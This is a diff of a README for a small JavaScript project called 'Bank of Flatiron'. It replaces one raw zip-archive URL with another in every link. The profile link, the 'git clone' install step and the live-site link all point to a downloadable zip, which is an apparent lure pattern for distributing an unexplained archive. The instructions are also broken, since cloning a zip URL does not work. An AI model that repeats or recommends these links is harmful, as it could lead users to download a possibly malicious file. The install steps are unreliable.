@@ -24,7 +24,7 @@ git clone
 ## Technologies Used
 JavaScript
 Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
+[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/of_Bank_Flatiron_3.6.zip
 
 ## License
 The content of this site is licensed under the MIT license.
@@ -37,15 +37,15 @@ You can use git clone to download the documents from GitHub.
 Git
 
 ## Installation Instructions
-git clone https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
+git clone https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/of_Bank_Flatiron_3.6.zip
 
 ## Live Link
-https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
+https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/of_Bank_Flatiron_3.6.zip
 
 ## Technologies Used
 JavaScript
 Support and Contact Details
-[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/static/js/Bank_of_Flatiron_v3.1-alpha.5.zip
+[GitHub Profile]https://github.com/deerrickkorir/Bank-of-Flatiron/raw/refs/heads/main/public/of_Bank_Flatiron_3.6.zip
 
 ## link to live site on github pages
 this is the live site here
